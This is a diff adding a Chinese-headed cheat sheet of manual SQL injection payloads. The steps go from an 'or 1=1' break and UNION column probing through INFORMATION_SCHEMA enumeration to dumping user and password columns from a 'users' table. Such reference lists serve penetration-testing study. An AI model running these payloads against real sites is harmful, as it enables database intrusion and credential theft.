@@ -18,3 +18,33 @@
 
 " union select 1,2,3 -- -
 ```
+
+-  记一次完整 SQL 手工注入语句
+
+```
+"
+
+" or 1=1 -- -
+
+" order by 3 -- -
+
+" union select 1,2,3 -- -
+
+" union select 1,2,version() -- -
+
+" union select 1,2,database() -- -
+
+" union select 1,2,user() -- -
+
+" union select 1,2,TABLE_SCHEMA from INFORMATION_SCHEMA.tables -- -
+
+" union select 1,2,table_name from INFORMATION_SCHEMA.tables -- -
+
+" union select 1,2,column_name from INFORMATION_SCHEMA.columns where table_name='users' -- -
+
+" union select 1,2,user from users -- -
+
+" union select 1,2,pass from users -- -
+
+" union select 1,2,position  from users -- -
+```
